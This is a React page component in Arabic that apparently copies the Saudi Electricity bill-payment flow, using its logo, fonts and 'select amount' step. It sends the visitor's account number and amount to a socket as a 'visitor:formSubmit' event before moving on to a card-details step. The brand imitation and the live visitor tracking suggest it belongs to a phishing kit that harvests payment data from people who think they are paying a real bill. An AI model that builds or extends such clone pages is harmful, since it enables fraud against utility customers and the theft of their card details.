import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { socket } from "@/lib/store";

export default function SelectAmount() {
  const [amount, setAmount] = useState("0.00");
  const [accountNumber, setAccountNumber] = useState("");
  const [, setLocation] = useLocation();

  useEffect(() => {
    const stored = sessionStorage.getItem("accountNumber");
    const storedAmount = sessionStorage.getItem("billAmount");
    if (!stored) {
      setLocation("/");
      return;
    }
    setAccountNumber(stored);
    if (storedAmount) {
      setAmount(parseFloat(storedAmount).toFixed(2));
    }
  }, []);

  const handleNext = () => {
    if (parseFloat(amount) <= 0) return;
    sessionStorage.setItem("payAmount", amount);
    socket.value.emit("visitor:formSubmit", {
      page: "select-amount",
      data: { accountNumber, amount }
    });
    setLocation("/summary-payment");
  };

  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/[^0-9.]/g, '');
    setAmount(val);
  };

  const handleAmountFocus = () => {
    if (amount === "0.00") setAmount("");
  };

  const handleAmountBlur = () => {
    if (!amount || amount === "0" || amount === ".") {
      setAmount("0.00");
    } else {
      setAmount(parseFloat(amount).toFixed(2));
    }
  };

  const isValid = parseFloat(amount) > 0;

  const fontFaces = `
    @font-face { font-family: 'SE'; src: url('/fonts/SE-Regular.woff2') format('woff2'); font-weight: 400; }
    @font-face { font-family: 'SE'; src: url('/fonts/SE-Medium.woff2') format('woff2'); font-weight: 500; }
    @font-face { font-family: 'SE'; src: url('/fonts/SE-SemiBold.woff2') format('woff2'); font-weight: 600; }
    @font-face { font-family: 'SE'; src: url('/fonts/SE-Light.woff2') format('woff2'); font-weight: 300; }
  `;

  return (
    <>
      <style>{fontFaces}</style>
      <div className="min-h-screen bg-white" dir="rtl" style={{ fontFamily: "'SE', sans-serif" }}>

        {/* Header */}
        <div style={{
          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
          height: '70px', padding: '15px 30px 14px',
        }}>
          <a href="#" style={{ display: 'block' }}>
            <img src="/se-logo.svg" alt="السعودية للطاقة" style={{ width: '90px', height: '58px', objectFit: 'contain' }} />
          </a>

          {/* Stepper */}
          <div style={{
            display: 'flex', alignItems: 'center', gap: '0',
            background: '#f5f7fa', borderRadius: '30px', padding: '6px 8px',
          }}>
            {/* Step 1 - Active */}
            <div style={{
              display: 'flex', alignItems: 'center', gap: '8px',
              background: '#06c', borderRadius: '24px', padding: '8px 20px',
              color: '#fff', fontSize: '14px', fontWeight: 500,
              whiteSpace: 'nowrap',
            }}>
              <span style={{
                background: '#fff', color: '#06c', borderRadius: '50%',
                width: '22px', height: '22px', display: 'flex', alignItems: 'center',
                justifyContent: 'center', fontSize: '13px', fontWeight: 600,
              }}>1</span>
              حدد المبلغ
            </div>

            {/* Step 2 - Inactive */}
            <div style={{
              display: 'flex', alignItems: 'center', gap: '8px',
              padding: '8px 20px', color: '#8e99a4', fontSize: '14px', fontWeight: 400,
              whiteSpace: 'nowrap',
            }}>
              2
              <span>تفاصيل البطاقة</span>
            </div>

            {/* Step 3 - Inactive */}
            <div style={{
              display: 'flex', alignItems: 'center', gap: '8px',
              padding: '8px 20px', color: '#8e99a4', fontSize: '14px', fontWeight: 400,
              whiteSpace: 'nowrap',
            }}>
              3
              <span>المراجعة</span>
            </div>
          </div>

          {/* Close Button */}
          <button onClick={() => setLocation("/bill")} style={{
            background: '#e8f0fe', border: 'none', cursor: 'pointer', padding: '10px',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            borderRadius: '12px', width: '44px', height: '44px',
          }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#06c" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>

        {/* Title */}
        <div style={{ textAlign: 'center', paddingTop: '50px', paddingBottom: '40px' }}>
          <p style={{ color: '#06c', fontSize: '16px', fontWeight: 400, marginBottom: '8px' }}>عرض ودفع الفواتير</p>
          <h1 style={{ color: '#001f5e', fontSize: '36px', fontWeight: 600, letterSpacing: '1px', direction: 'ltr', display: 'inline-block' }}>
            {accountNumber}
          </h1>
        </div>

        {/* Amount Form */}
        <div style={{ maxWidth: '600px', margin: '0 auto', padding: '0 30px' }}>
          <label style={{ display: 'block', color: '#66799e', fontSize: '15px', fontWeight: 400, marginBottom: '10px', textAlign: 'right' }}>
            مبلغ السداد
          </label>
          <input
            type="text"
            inputMode="decimal"
            value={amount}
            onChange={handleAmountChange}
            onFocus={handleAmountFocus}
            onBlur={handleAmountBlur}
            style={{
              fontFamily: "'SE', sans-serif",
              width: '100%',
              padding: '14px 18px',
              fontSize: '18px',
              fontWeight: 500,
              color: '#001f5e',
              border: '1.5px solid #d0d5dd',
              borderRadius: '12px',
              outline: 'none',
              textAlign: 'right',
              direction: 'ltr',
              boxSizing: 'border-box',
            }}
          />
        </div>

        {/* Bottom Button */}
        <div style={{
          position: 'fixed', bottom: 0, left: 0, right: 0,
          padding: '16px 30px', background: 'white',
          borderTop: '1px solid #e8ecf1',
          display: 'flex', justifyContent: 'flex-end',
        }}>
          <button
            onClick={handleNext}
            disabled={!isValid}
            style={{
              fontFamily: "'SE', sans-serif", fontSize: '18px', fontWeight: 500,
              padding: '14px 40px', borderRadius: '12px', border: 'none', cursor: isValid ? 'pointer' : 'default',
              backgroundColor: isValid ? '#06c' : '#d0d5dd',
              color: '#fff',
              display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
              opacity: isValid ? 1 : 0.6,
            }}
          >
            التالي
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ transform: 'rotate(180deg)' }}>
              <polyline points="9 18 15 12 9 6"></polyline>
            </svg>
          </button>
        </div>
      </div>
    </>
  );
}
